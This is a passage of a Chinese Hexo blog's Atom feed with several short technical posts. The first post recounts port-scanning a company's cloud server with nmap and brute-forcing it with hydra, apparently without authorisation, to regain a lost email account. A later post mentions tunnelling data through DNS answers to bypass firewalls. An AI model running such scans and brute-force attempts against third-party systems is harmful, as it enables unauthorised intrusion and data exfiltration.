    <content type="html"><![CDATA[<h3 id="写在前面"><a href="#写在前面" class="headerlink" title="写在前面"></a>写在前面</h3><hr><p>&#160; &#160; &#160;&#160;由于之前没玩过steam的游戏,刚好那天steam客户端被劫持,不小心买到了租号公司的游戏,给的邮箱是他们公司的邮箱,后来邮箱就登不上了。　　</p><h3 id="查邮箱服务器的IP地址"><a href="#查邮箱服务器的IP地址" class="headerlink" title="查邮箱服务器的IP地址"></a>查邮箱服务器的IP地址</h3><hr><p>&#160; &#160; &#160;&#160;47.75.X.XXX,阿里云主机</p><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><hr><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">nmap -p 3389 47.75.X.XXX</span><br><span class="line">nmap -p 1-65535 -T4 -A -v 47.75.X.XXX</span><br><span class="line">hydra -L username.txt -P password.txt -s port 47.75.X.XXX   (小写的时候直接用户名跟密码-l username -p password)</span><br></pre></td></tr></table></figure><p>&#160; &#160; &#160;&#160;发现3389端口是打开的,一顿爆破之后发现不是telnet服务,而是ssl</p><h3 id="子域名查询"><a href="#子域名查询" class="headerlink" title="子域名查询"></a>子域名查询</h3><hr><p>&#160; &#160; &#160;&#160;在线查询工具：<a href="https://pentest-tools.com/information-gathering/find-subdomains-of-domain" target="_blank" rel="noopener">点击这里</a></p><p>&#160; &#160; &#160;&#160;没有收获</p><h3 id="继续收集信息"><a href="#继续收集信息" class="headerlink" title="继续收集信息"></a>继续收集信息</h3><hr><p>&#160; &#160; &#160;&#160;SEO综合查询：<a href="https://www.aizhan.com/" target="_blank" rel="noopener">点击这里</a></p><p>&#160; &#160; &#160;&#160;找到同一个注册人的另一个网站(B网站),同样是一个经营租号业务的网站,注册邮箱是QQ邮箱,先加他好友,看能不能动之以情。</p><p>&#160; &#160; &#160;&#160;一天后…..</p><p>&#160; &#160; &#160;&#160;没回应…..</p><h3 id="Github收集信息"><a href="#Github收集信息" class="headerlink" title="Github收集信息"></a>Github收集信息</h3><hr><p>&#160; &#160; &#160;&#160;发现有B网站的开源代码,另外发现三个子域名。</p><h3 id="尾声"><a href="#尾声" class="headerlink" title="尾声"></a>尾声</h3><hr><p>在B网站看到了客服QQ,客服给了另外一个邮箱登录地址<a href="http://mx.banmajs.com/mail" target="_blank" rel="noopener">点击这里</a>,完美解决问题,累……….</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;写在前面&quot;&gt;&lt;a href=&quot;#写在前面&quot; class=&quot;headerlink&quot; title=&quot;写在前面&quot;&gt;&lt;/a&gt;写在前面&lt;/h3&gt;&lt;hr&gt;
&lt;p&gt;&amp;#160; &amp;#160; &amp;#160;&amp;#160;由于之前没玩过steam的游戏,刚好那天steam客户端被劫持
      
    
    </summary>
    
      <category term="practice" scheme="http://duyana.top/categories/practice/"/>
    
    
  </entry>
  
  <entry>
    <title>关于eclipse与myeclipse中的工程如何在IDEA中运行</title>
    <link href="http://duyana.top/post/8623d21/"/>
    <id>http://duyana.top/post/8623d21/</id>
    <published>2018-05-18T09:16:40.000Z</published>
    <updated>2018-07-27T15:11:31.607Z</updated>
    
    <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/u014639129/article/details/52489718" target="_blank" rel="noopener">eclipse-to-idea</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/u014639129/article/details/52489718&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;eclipse-to-idea&lt;/a&gt;&lt;/p&gt;

      
    
    </summary>
    
      <category term="web" scheme="http://duyana.top/categories/web/"/>
    
    
  </entry>
  
  <entry>
    <title>关于#if defined</title>
    <link href="http://duyana.top/post/c06a3bf0/"/>
    <id>http://duyana.top/post/c06a3bf0/</id>
    <published>2018-05-17T03:16:31.000Z</published>
    <updated>2018-07-27T15:11:31.591Z</updated>
    
    <content type="html"><![CDATA[<h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><p>#if defined 相较于 #ifdef后面确实是可以接多个宏，但是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#if defined A || B</span><br></pre></td></tr></table></figure></p><p>的写法是错误的，正确的写法应该是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#if defined A || defined B</span><br></pre></td></tr></table></figure></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;注意点&quot;&gt;&lt;a href=&quot;#注意点&quot; class=&quot;headerlink&quot; title=&quot;注意点&quot;&gt;&lt;/a&gt;注意点&lt;/h3&gt;&lt;p&gt;#if defined 相较于 #ifdef后面确实是可以接多个宏，但是&lt;br&gt;&lt;figure class=&quot;highlight p
      
    
    </summary>
    
      <category term="c" scheme="http://duyana.top/categories/c/"/>
    
    
  </entry>
  
  <entry>
    <title>excel2007 .xlsm文件中查看宏代码</title>
    <link href="http://duyana.top/post/bf1c2fd3/"/>
    <id>http://duyana.top/post/bf1c2fd3/</id>
    <published>2018-05-16T08:47:32.000Z</published>
    <updated>2018-07-27T15:11:31.607Z</updated>
    
    <content type="html"><![CDATA[<ul><li>不能使用wps，wps需要插件才能查看宏代码。</li><li>视图—&gt;宏—&gt;查看宏(VBS代码)</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ul&gt;
&lt;li&gt;不能使用wps，wps需要插件才能查看宏代码。&lt;/li&gt;
&lt;li&gt;视图—&amp;gt;宏—&amp;gt;查看宏(VBS代码)&lt;/li&gt;
&lt;/ul&gt;

      
    
    </summary>
    
      <category term="windows" scheme="http://duyana.top/categories/windows/"/>
    
    
  </entry>
  
  <entry>
    <title>关于wps不能使用excel宏</title>
    <link href="http://duyana.top/post/fac85dbf/"/>
    <id>http://duyana.top/post/fac85dbf/</id>
    <published>2018-05-08T01:02:18.000Z</published>
    <updated>2018-07-27T15:11:31.607Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Excel宏"><a href="#Excel宏" class="headerlink" title="Excel宏"></a>Excel宏</h1><p>wps要使用宏需要安装vba6.mis<br>宏可以执行vb代码</p><h1 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h1><p>利用DNS服务器获取IP地址，IP地址可以转换成四个字节得到数据。以此传输数据绕过防火墙。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Excel宏&quot;&gt;&lt;a href=&quot;#Excel宏&quot; class=&quot;headerlink&quot; title=&quot;Excel宏&quot;&gt;&lt;/a&gt;Excel宏&lt;/h1&gt;&lt;p&gt;wps要使用宏需要安装vba6.mis&lt;br&gt;宏可以执行vb代码&lt;/p&gt;
&lt;h1 id=&quot;tips&quot;&gt;&lt;a 
      
    
    </summary>
    
      <category term="乌云" scheme="http://duyana.top/categories/%E4%B9%8C%E4%BA%91/"/>
    
    
  </entry>
  
  <entry>
    <title>cmd命令行复制操作</title>
    <link href="http://duyana.top/post/b4fc98c5/"/>
    <id>http://duyana.top/post/b4fc98c5/</id>
    <published>2018-04-25T09:45:31.000Z</published>
    <updated>2018-07-27T15:11:31.607Z</updated>
    
    <content type="html"><![CDATA[<h3 id="本地"><a href="#本地" class="headerlink" title="本地"></a>本地</h3><p>copy 1.txt D:\test\</p><h3 id="网络路径"><a href="#网络路径" class="headerlink" title="网络路径"></a>网络路径</h3><p>copy 1.txt \192.168.1.1\test\</p><p><strong>需要注意的地方</strong></p><ul><li>windows下所有路径中都是反斜杠而不是斜杠</li><li>路径以斜杠开头时为什么要两个反斜杠？<br>因为 \ 在 C/C++/C# 中是转义前导字符，例如 \n 代表换行，如果路径中刚好有类似转义字符开头的，那么就会引起问题，所以路径中的 \ 必须用 \\ 的形式。</li><li>windows下表示参数也是斜杠，跟linux一样，如systeminfo | findstr /B /C:”OS”</li></ul><p><strong>展开</strong></p><blockquote><p>http://<br>http后面也跟了两个斜杠，其实一个斜杠或者没有斜杠也是可以的。</p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;本地&quot;&gt;&lt;a href=&quot;#本地&quot; class=&quot;headerlink&quot; title=&quot;本地&quot;&gt;&lt;/a&gt;本地&lt;/h3&gt;&lt;p&gt;copy 1.txt D:\test\&lt;/p&gt;
&lt;h3 id=&quot;网络路径&quot;&gt;&lt;a href=&quot;#网络路径&quot; class=&quot;headerlin
      
    
    </summary>
    
      <category term="windows" scheme="http://duyana.top/categories/windows/"/>
    
    
  </entry>
  
  <entry>
    <title>关于windows中添加网络位置与映射网络驱动器的区别</title>
    <link href="http://duyana.top/post/3ee39e03/"/>
    <id>http://duyana.top/post/3ee39e03/</id>
    <published>2018-04-23T08:26:19.000Z</published>
    <updated>2018-07-27T15:11:31.607Z</updated>
    
    <content type="html"><![CDATA[<h3 id="网络位置"><a href="#网络位置" class="headerlink" title="网络位置"></a>网络位置</h3><ul><li>无盘符</li><li>只是一个标记，功能不多，例如不能被设备上其它工程访问到</li><li>占的通信流量少，如果只是简单的文件传输，可以用这个</li></ul><h3 id="网络驱动器"><a href="#网络驱动器" class="headerlink" title="网络驱动器"></a>网络驱动器</h3><ul><li>有盘符</li><li>相当于本地的磁盘</li><li>占的通信流量多</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;网络位置&quot;&gt;&lt;a href=&quot;#网络位置&quot; class=&quot;headerlink&quot; title=&quot;网络位置&quot;&gt;&lt;/a&gt;网络位置&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;无盘符&lt;/li&gt;
&lt;li&gt;只是一个标记，功能不多，例如不能被设备上其它工程访问到&lt;/li&gt;
&lt;li&gt;占的通信流量
      
    
    </summary>
    
      <category term="windows" scheme="http://duyana.top/categories/windows/"/>
    
    
  </entry>
  
  <entry>
    <title>TCP三次握手四次挥手</title>
    <link href="http://duyana.top/post/627d7c1/"/>
    <id>http://duyana.top/post/627d7c1/</id>
    <published>2018-04-21T12:30:04.000Z</published>
    <updated>2018-07-27T15:11:31.607Z</updated>
    
    <content type="html"><![CDATA[<h3 id="三次握手"><a href="#三次握手" class="headerlink" title="三次握手"></a>三次握手</h3><p>　　客户端：你好！我想跟你建立连接（SYN=1），我随机生成一个号码（Seq=x）给你。<br>　　服务端：你好！我确认（ACK=1）了，你真的要建立连接（SYN=1）吗？我把你给的随机号加1还给你（ack=x+1）,我也给你生成一随机号（Seq=y）。<br>　　客户端：你好！看到你确认了，我得核对（ack是否等于我第一次给你的随机号x加1，ACK是否等于1）一下，核对没问题，那我也确认（ACK=1）了，也把你给的随机号加1（ack=y+1）一起发给你。</p><blockquote><p>最后服务端核对（ack是否等于y加1，ACK是否等于1）,核对成功那么就可以建立连接了。</p></blockquote><h3 id="四次挥手"><a href="#四次挥手" class="headerlink" title="四次挥手"></a>四次挥手</h3><p>　　客户端：你好！再见（FIN）了，给你说完这句话我就不会回你了，不过你还有什么想对我说的吗？我还是可以听到的，我随机生成一个号码（Seq=x）给你。<br>　　服务端：你好！我确认（与握手的确认一样）看到你说的话了。我组织一下语言看看我还有什么想说的。我随机生成一个号码（Seq=y）给你。<br>　　．．．．．（服务端给客户端的信息，如果有的话）<br>　　服务端：你好！我说完了，再见（FIN）！我随机生成一个号码（Seq=z）给你。<br>　　客户端：你好！我也确认（与握手的确认一样）看到你说的话了。</p><blockquote><p>最后服务端核对（ack是否等于z加1，ACK是否等于1）,核对成功那么就可以建立连接了。</p></blockquote><p><strong>备注</strong>：每次都会生成随机号（Seq）与将接收到的随机号加一赋值给ack(ack=Seq+1)，以上为了不冗余有省略。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;三次握手&quot;&gt;&lt;a href=&quot;#三次握手&quot; class=&quot;headerlink&quot; title=&quot;三次握手&quot;&gt;&lt;/a&gt;三次握手&lt;/h3&gt;&lt;p&gt;　　客户端：你好！我想跟你建立连接（SYN=1），我随机生成一个号码（Seq=x）给你。&lt;br&gt;　　服务端：你好！我确认（A
      
    
    </summary>
    
      <category term="网络" scheme="http://duyana.top/categories/network/"/>
    
    
  </entry>
  
  <entry>
    <title>关于段地址与偏移地址(8086CPU)</title>
    <link href="http://duyana.top/post/645fcee2/"/>
    <id>http://duyana.top/post/645fcee2/</id>
    <published>2018-04-20T09:23:58.000Z</published>
    <updated>2018-07-27T15:11:31.607Z</updated>
    
    <content type="html"><![CDATA[<h3 id="为什么要用段地址与偏移地址来决定物理地址"><a href="#为什么要用段地址与偏移地址来决定物理地址" class="headerlink" title="为什么要用段地址与偏移地址来决定物理地址"></a>为什么要用段地址与偏移地址来决定物理地址</h3><p>　　物理地址 = 段地址 * 16 + 偏移地址，这样处理的意义是什么？<br>　　我的理解，有人要还你843块钱，那么你希望收到一堆零钱还是希望收到8张一百43块零钱呢，你如果不觉得麻烦可以会选择前者，但是CPU觉得麻烦，843 = 80 * 10 + 43，十进制所以是10不是16，所以段的长度就是一百块钱，偏移地址就是43块零钱，段地址为80，所以一开始理解的时候不要把注意力放在段地址上面。而是80 * 10(段地址 * 16)上面，CPU称之为基础地址，8086CPU读取内存中的数据就是利用这种方式寻址的。<br>　　所以内存中其实是没有一个一个段的，就是这843块钱也可以是843张一元大钞一样。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;为什么要用段地址与偏移地址来决定物理地址&quot;&gt;&lt;a href=&quot;#为什么要用段地址与偏移地址来决定物理地址&quot; class=&quot;headerlink&quot; title=&quot;为什么要用段地址与偏移地址来决定物理地址&quot;&gt;&lt;/a&gt;为什么要用段地址与偏移地址来决定物理地址&lt;/h3&gt;&lt;
      
    
    </summary>
    
      <category term="汇编" scheme="http://duyana.top/categories/collection/"/>
    
    
  </entry>
  
  <entry>
    <title>第一次搭建hexo+github遇到的坑</title>
    <link href="http://duyana.top/post/3e73ea95/"/>
    <id>http://duyana.top/post/3e73ea95/</id>
    <published>2018-04-19T03:23:58.000Z</published>
    <updated>2018-07-27T15:11:31.607Z</updated>
    
    <content type="html"><![CDATA[<h3 id="hexo-d提交不成功"><a href="#hexo-d提交不成功" class="headerlink" title="hexo d提交不成功"></a>hexo d提交不成功</h3><ul><li>配置Git环境变量，配置完一定要退出当前shell环境，重新打开。</li><li>删除<strong>.deploy_git</strong>文件夹，重新运行hexo g, hexo d。</li><li>在git bash中执行hexo d命令，才能上传成功，这里原因不明，以下是在cmd中执行的结果。<blockquote><p>INFO  Deploying: git<br>INFO  Clearing .deploy_git folder…<br>INFO  Copying files from public folder…<br>INFO  Copying files from extend dirs…</p></blockquote></li></ul><h3 id="执行hexo-d命令时总是要输出github的用户名和密码"><a href="#执行hexo-d命令时总是要输出github的用户名和密码" class="headerlink" title="执行hexo d命令时总是要输出github的用户名和密码"></a>执行hexo d命令时总是要输出github的用户名和密码</h3><ul><li>win7可以这么解决，<a href="https://blog.csdn.net/forevercjl/article/details/39557713" target="_blank" rel="noopener">https://blog.csdn.net/forevercjl/article/details/39557713</a></li><li>修改最外层的_config.yml仓库repo, 去github复制链接，https改为ssh形式的，由于电脑上有私钥，故不再需要输入账号密码。</li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;hexo-d提交不成功&quot;&gt;&lt;a href=&quot;#hexo-d提交不成功&quot; class=&quot;headerlink&quot; title=&quot;hexo d提交不成功&quot;&gt;&lt;/a&gt;hexo d提交不成功&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;配置Git环境变量，配置完一定要退出当前shell环境，
      
    
    </summary>
    
      <category term="hexo" scheme="http://duyana.top/categories/hexo/"/>
    
    
  </entry>
  
</feed>
